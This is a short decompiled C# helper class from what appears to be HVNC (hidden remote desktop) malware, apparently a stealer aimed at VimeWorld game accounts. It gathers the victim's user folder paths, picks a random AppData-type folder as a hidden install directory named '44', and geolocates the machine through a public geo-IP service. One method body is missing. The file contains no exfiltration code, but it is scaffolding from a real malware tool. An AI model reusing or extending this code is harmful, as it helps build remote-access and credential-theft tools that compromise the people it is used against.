using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Xml;

namespace BirdBrainmofo.HVNC.Helpers
{
	// Token: 0x020000D9 RID: 217
	internal class Help
	{
		// Token: 0x060008CE RID: 2254 RVA: 0x00060520 File Offset: 0x0005E720
		public static void Ethernet()
		{
			try
			{
				xml.LoadXml(new WebClient().DownloadString(GeoIP));
			}
			catch (Exception ex)
			{
				Exception ex2 = ex;
				Console.WriteLine(((ex2 != null) ? ex2.ToString() : null) + "Ethernet()");
				check = false;
			}
		}

		// Token: 0x060008CF RID: 2255 RVA: 0x00006F52 File Offset: 0x00005152

        // Token: 0x060008D0 RID: 2256 RVA: 0x00060580 File Offset: 0x0005E780
		// Note: this type is marked as 'beforefieldinit'.
		static Help()
		{
		}

		// Token: 0x04000718 RID: 1816
		public static readonly string DesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);

		// Token: 0x04000719 RID: 1817
		public static readonly string LocalData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

		// Token: 0x0400071A RID: 1818
		public static readonly string System = Environment.GetFolderPath(Environment.SpecialFolder.System);

		// Token: 0x0400071B RID: 1819
		public static readonly string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

		// Token: 0x0400071C RID: 1820
		public static readonly string CommonData = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData);

		// Token: 0x0400071D RID: 1821
		public static readonly string MyDocuments = Environment.GetFolderPath(Environment.SpecialFolder.Personal);

		// Token: 0x0400071E RID: 1822
		public static readonly string UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

		// Token: 0x0400071F RID: 1823
		public static readonly string ExploitName = Assembly.GetExecutingAssembly().Location;

		// Token: 0x04000720 RID: 1824
		public static readonly string ExploitDirectory = Path.GetDirectoryName(ExploitName);

		// Token: 0x04000721 RID: 1825
		public static string[] SysPatch = {
			AppData,
			LocalData,
			CommonData
		};

		// Token: 0x04000722 RID: 1826
		public static string zxczxczxc = SysPatch[new Random().Next(0, SysPatch.Length)];

		// Token: 0x04000723 RID: 1827
		public static string ExploitDir = Path.Combine(zxczxczxc, "44");

		// Token: 0x04000724 RID: 1828
		public static string date = DateTime.Now.ToString("MM/dd/yyyy h:mm");

		// Token: 0x04000725 RID: 1829
		public static string dateLog = DateTime.Now.ToString("MM/dd/yyyy");

		// Token: 0x04000726 RID: 1830
		public static string VimeAPI = "https://api.vimeworld.ru/user/name/";

		// Token: 0x04000727 RID: 1831
		public static string GeoIP = "https://freegeoip.app/xml/";

		// Token: 0x04000728 RID: 1832
		public static XmlDocument xml = new XmlDocument();

		// Token: 0x04000729 RID: 1833
		public static bool check = true;
	}
}
